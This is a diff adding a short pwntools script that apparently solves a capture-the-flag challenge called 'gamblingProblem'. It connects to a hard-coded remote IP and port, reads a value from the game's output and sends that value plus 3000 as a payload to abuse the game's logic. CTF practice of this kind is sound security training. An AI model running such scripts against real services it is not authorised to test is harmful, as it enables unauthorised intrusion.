@@ -1,0 +1,27 @@
+from pwn import *
+
+#p = process('./gamblingProblem')
+p = remote('128.199.157.172', 25880)
+
+
+print p.recv()
+p.sendline('1')
+print p.recv()
+a = p.recv()
+print a.split()
+payload = str(int(a.split()[14])+3000)
+p.sendline('1')
+print p.recv()
+p.sendline(payload)
+print p.recv()
+p.sendline('0')
+print p.recv()
+print p.recv()
+print p.recv()
+print p.recv()
+p.sendline('0')
+print p.recv()
+p.sendline('2')
+print p.recv()
+p.sendline('1')
+print p.recv()
